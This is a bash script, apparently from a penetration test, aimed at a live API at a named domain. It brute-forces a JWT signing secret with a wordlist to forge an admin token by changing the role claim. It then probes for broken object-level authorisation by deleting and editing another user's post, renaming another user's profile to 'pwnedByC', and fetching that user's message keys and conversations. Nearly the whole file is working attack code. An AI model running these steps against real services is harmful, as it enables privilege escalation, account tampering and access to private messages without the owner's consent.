#!/usr/bin/env bash
A="https://api.breezy.philippeluu.fr"; OUT=/tmp/riveta
TB=$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$OUT/regB.json")
TC=$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$OUT/regC.json")
BID="855b1cbc-5c37-4a43-aeef-5dda0e27965c"
CID="fe296cf5-4ec4-4dbe-9219-b394a7995694"
b64url(){ openssl base64 -A | tr '+/' '-_' | tr -d '='; }
hdr=$(echo "$TB" | cut -d. -f1); pay=$(echo "$TB" | cut -d. -f2)

echo "===== weak-secret HS256 forge (admin) ====="
hdr256=$(printf '{"alg":"HS256","typ":"JWT"}' | b64url)
apay=$(echo "$pay" | tr '_-' '/+' | base64 -d 2>/dev/null | sed 's/"role":"user"/"role":"admin"/' | b64url)
found=0
for s in secret secret123 changeme jwt_secret jwtsecret supersecret password 123456 breezy breezy_secret your-256-bit-secret my_secret access_secret JWT_SECRET test dev secretkey mysecretkey s3cr3t breezy-api api-gateway gateway accessSecret refreshSecret; do
  sig=$(printf '%s' "$hdr256.$apay" | openssl dgst -sha256 -hmac "$s" -binary | b64url)
  code=$(curl -sS -m 8 -o /dev/null -w "%{http_code}" "$A/users/me" -H "Authorization: Bearer $hdr256.$apay.$sig")
  [ "$code" = "200" ] && { echo "!!! WEAK SECRET='$s'"; found=1; break; }
done
[ $found -eq 0 ] && echo "no weak secret found (all rejected)"

echo
echo "===== create a post as B ====="
POSTRESP=$(curl -sS -m 10 -X POST "$A/posts" -H "Authorization: Bearer $TB" -H "Content-Type: application/json" -d '{"content":"riveta-pentest marker post (safe to delete)"}')
echo "$POSTRESP" | head -c 300; echo
PID=$(echo "$POSTRESP" | sed -n 's/.*"id":"\([0-9a-f]\{24\}\)".*/\1/p' | head -1)
echo "B post id = $PID"

echo
echo "===== IDOR: can C modify/delete B's post? ====="
echo -n "C DELETE /posts/$PID -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" -X DELETE "$A/posts/$PID" -H "Authorization: Bearer $TC"
echo -n "C PUT /posts/$PID -> ";    curl -sS -m 10 -o /dev/null -w "%{http_code}\n" -X PUT "$A/posts/$PID" -H "Authorization: Bearer $TC" -H "Content-Type: application/json" -d '{"content":"hijacked-by-C"}'
echo -n "verify post still B-owned -> "; curl -sS -m 10 "$A/posts/$PID" | head -c 200; echo

echo
echo "===== IDOR: can C update B's profile (object-level auth)? ====="
for m in PUT PATCH; do
 for path in "/users/$BID" "/users/me"; do
  echo -n "C $m $path (target B) -> "
  curl -sS -m 10 -o /dev/null -w "%{http_code}\n" -X $m "$A$path" -H "Authorization: Bearer $TC" -H "Content-Type: application/json" -d "{\"id\":\"$BID\",\"username\":\"pwnedByC\"}"
 done
done

echo
echo "===== IDOR: private messages / keys cross-account ====="
echo -n "C GET /messages/keys (self) -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" "$A/messages/keys" -H "Authorization: Bearer $TC"
echo -n "C GET /messages/keys/$BID -> "; curl -sS -m 10 -w " [%{http_code}]\n" "$A/messages/keys/$BID" -H "Authorization: Bearer $TC" | head -c 200
echo -n "C GET /messages/conversations -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" "$A/messages/conversations" -H "Authorization: Bearer $TC"
echo -n "C GET /users/me/followers/$BID -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" "$A/users/me/followers/$BID" -H "Authorization: Bearer $TC"
